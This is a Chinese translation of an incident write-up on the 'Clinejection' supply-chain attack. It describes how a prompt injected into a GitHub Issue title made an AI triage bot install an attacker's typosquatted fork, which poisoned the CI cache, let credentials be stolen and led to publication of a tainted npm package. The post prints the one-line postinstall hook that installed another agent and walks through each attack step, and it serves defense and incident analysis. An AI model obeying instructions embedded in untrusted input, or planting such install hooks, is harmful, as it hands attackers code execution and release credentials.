---
layout: post
title: "Clinejection：当你的 AI 工具悄悄安装了另一个 AI"
date: 2026-03-06 04:42:51 +0800
categories: tech-translation
description: "一次从 GitHub Issue 标题开始的供应链攻击，导致 4000 台开发者机器被植入恶意 AI 代理。攻击者利用提示词注入让 AI 自动化工具执行任意代码，窃取凭证并发布被污染的 npm 包。"
original_url: https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another
source: Hacker News
---

本文翻译自 [Clinejection: When Your AI Tool Installs Another](https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another)，原载于 Hacker News。

---

## 五步从 GitHub Issue 到 4000 台被入侵的开发者机器

2026 年 2 月 17 日，有人向 npm 发布了 `cline@2.3.0`。这个版本的 CLI 二进制文件与前一版本完全相同，唯一的改动是 `package.json` 中的一行：

```
"postinstall": "npm install -g openclaw@latest"
```

在接下来的 8 小时里，每个安装或更新 Cline 的开发者都会在不知情的情况下，全局安装另一个名为 OpenClaw 的 AI 代理——这个代理拥有完整的系统访问权限。在包被下架前，大约发生了 4,000 次下载。

有趣的部分不在于载荷本身，而在于攻击者是如何获得 npm token 的：通过向 GitHub Issue 标题注入提示词（prompt），一个 AI 问题分类机器人读取并执行了这个"指令"。

## 完整攻击链

这次被 Snyk 命名为 "Clinejection" 的攻击，将五个已知的漏洞串联成一个完整的漏洞利用链——攻击者只需要创建一个 GitHub Issue。

### 第一步：通过 Issue 标题注入提示词

Cline 部署了一个使用 Anthropic `claude-code-action` 的 AI 驱动 Issue 分类工作流。该工作流配置了 `allowed_non_write_users: "*"`，意味着任何 GitHub 用户都可以通过创建 Issue 来触发它。Issue 标题通过 `${{ github.event.issue.title }}` 直接插入到 Claude 的提示词中，没有任何过滤。

1 月 28 日，攻击者创建了 Issue #8904，标题看起来像一个性能报告，但其中嵌入了一条指令：从特定 GitHub 仓库安装一个包。

### 第二步：AI 机器人执行任意代码

Claude 将注入的指令解读为合法请求，并运行了 `npm install`，指向攻击者的 fork——一个故意拼错的仓库（`glthub-actions/cline`，注意 'github' 中少了 'i'）。该 fork 的 `package.json` 包含一个 preinstall 脚本，会获取并执行远程 shell 脚本。

### 第三步：缓存投毒

Shell 脚本部署了 Cacheract——一个 GitHub Actions 缓存投毒工具。它向缓存中注入超过 10GB 的垃圾数据，触发 GitHub 的 LRU（最近最少使用）淘汰策略，将合法缓存条目挤掉。被污染的条目被精心设计以匹配 Cline 每夜发布工作流使用的缓存键模式。

### 第四步：凭证窃取

当每夜发布工作流运行并从缓存恢复 `node_modules` 时，它获得了被污染的版本。发布工作流持有 `NPM_RELEASE_TOKEN`、`VSCE_PAT`（VS Code Marketplace）和 `OVSX_PAT`（OpenVSX）。这三个凭证全部被窃取。

### 第五步：恶意发布

使用窃取的 npm token，攻击者发布了带有 OpenClaw postinstall 钩子的 `cline@2.3.0`。被污染的版本在线 8 小时后，StepSecurity 的自动监控才标记它——大约在发布后 14 分钟。

## 搞砸的轮换让事情变得更糟

安全研究员 Adnan Khan 实际上在 2025 年 12 月下旬就发现了这个漏洞链，并于 2026 年 1 月 1 日通过 GitHub 安全公告报告了它。他在五周内发送了多次跟进，但没有收到任何回复。

当 Khan 在 2 月 9 日公开披露时，Cline 在 30 分钟内通过移除 AI 分类工作流完成了修补。他们第二天开始凭证轮换。

但轮换是不完整的。团队删除了错误的 token，让暴露的那个保持活跃。他们在 2 月 11 日发现错误并重新轮换。但攻击者已经窃取了凭证，npm token 保持有效的时间足够长，以至于六天后发布了被污染的包。

Khan 不是攻击者。另一个未知的行动者发现了 Khan 测试仓库上的概念验证，并将其武器化直接攻击 Cline。

## 新模式：AI 安装 AI

这个具体的漏洞链很有趣但并非史无前例。提示词注入、缓存投毒和凭证窃取都是已记录的攻击类别。Clinejection 的独特之处在于结果：一个 AI 工具在开发者机器上静默引导安装第二个 AI 代理。

这在供应链中创造了一个递归问题。开发者信任工具 A（Cline）。工具 A 被入侵以安装工具 B（OpenClaw）。工具 B 有自己的能力——shell 执行、凭证访问、持久化守护进程安装——这些独立于工具 A，对开发者最初的信任决策不可见。

安装的 OpenClaw 可以从 `~/.openclaw/` 读取凭证，通过其 Gateway API 执行 shell 命令，并将自己安装为重启后仍然存活的持久化系统守护进程。严重性有争议——Endor Labs 将载荷描述为更接近概念验证而非武器化攻击——但机制才是关键。下一个载荷不会是概念验证。

这是供应链版的"困惑代理人"（confused deputy）：开发者授权 Cline 代表他们行事，而 Cline（通过入侵）将该权限委托给一个完全独立的代理——开发者从未评估、从未配置、从未同意的代理。

## 为什么现有控制没有捕获它

**npm audit**：postinstall 脚本安装的是一个合法的、非恶意的包（OpenClaw）。没有恶意软件可检测。

**代码审查**：CLI 二进制文件与前一个版本字节相同。只有 `package.json` 改变了，而且只改了一行。专注于二进制变更的自动差异检查会漏掉它。

**来源证明**：Cline 当时没有使用基于 OIDC 的 npm 来源证明。被盗 token 可以在没有来源元数据的情况下发布，StepSecurity 将此标记为异常。

**权限提示**：安装发生在 `npm install` 期间的 postinstall 钩子中。没有任何 AI 编码工具会在依赖项的生命周期脚本运行之前提示用户。操作是不可见的。

攻击利用了开发者认为自己正在安装的东西（Cline 的特定版本）与实际执行的东西（包中的任意生命周期脚本及其传递安装的所有内容）之间的差距。

## Cline 之后的改变

Cline 的事后分析概述了几个补救步骤：

- 从处理凭证的工作流中消除 GitHub Actions 缓存使用
- 为 npm 发布采用 OIDC 来源证明，消除长期存在的 token
- 为凭证轮换添加验证要求
- 开始制定带有 SLA 的正式漏洞披露流程
- 委托第三方对 CI/CD 基础设施进行安全审计

这些是有意义的改进。仅 OIDC 迁移就可以阻止攻击——当来源需要来自特定 GitHub Actions 工作流的加密证明时，被盗 token 无法发布包。

## 架构问题

Clinejection 是一次供应链攻击，但它也是一个代理安全问题。入口点是 GitHub Issue 标题中的自然语言。链条的第一个环节是一个 AI 机器人，它将不可信的文本解读为指令，并以 CI 环境的权限执行它。

这与我们在 MCP 工具投毒和代理技能注册表背景下写的结构模式相同——不可信输入到达代理，代理对其采取行动，在执行之前没有任何东西评估结果操作。

这里的区别在于，代理不是开发者的本地编码助手。它是一个自动化的 CI 工作流，在每个新 Issue 上运行，拥有 shell 访问权限和缓存的凭证。爆炸半径不是一台开发者的机器——而是整个项目的发布管道。

每个在 CI/CD 中部署 AI 代理的团队——用于 Issue 分类、代码审查、自动化测试或任何其他工作流——都有同样的暴露。代理处理不可信输入（Issue、PR、评论）并可以访问机密（token、密钥、凭证）。问题在于是否有任何东西评估代理对该访问权限的使用。

## 关键启示

1. **提示词注入是真实威胁**：任何接受外部输入的 AI 代理都可能在处理恶意提示词后执行意外操作。

2. **CI/CD 中的 AI 需要特别关注**：自动化工作流拥有高权限，一旦被利用影响范围巨大。

3. **供应链攻击在进化**：从传统恶意代码到利用 AI 工具的信任链，攻击面在扩大。

4. **凭证轮换必须彻底**：不完整的轮换可能让攻击者在窗口期内继续利用被盗凭证。

5. **来源证明很重要**：OIDC-based provenance 可以有效防止 token 被盗后的滥用。

6. **syscall 层面的拦截**：无论哪个代理触发了操作，在系统调用层面进行策略评估可以捕获这类攻击。

---

这个案例给我们的警示是：当你授权一个 AI 工具时，你可能也在不知不觉中授权了它能够安装和运行的所有东西。在 AI 工具日益普及的今天，我们需要重新思考信任边界的定义。
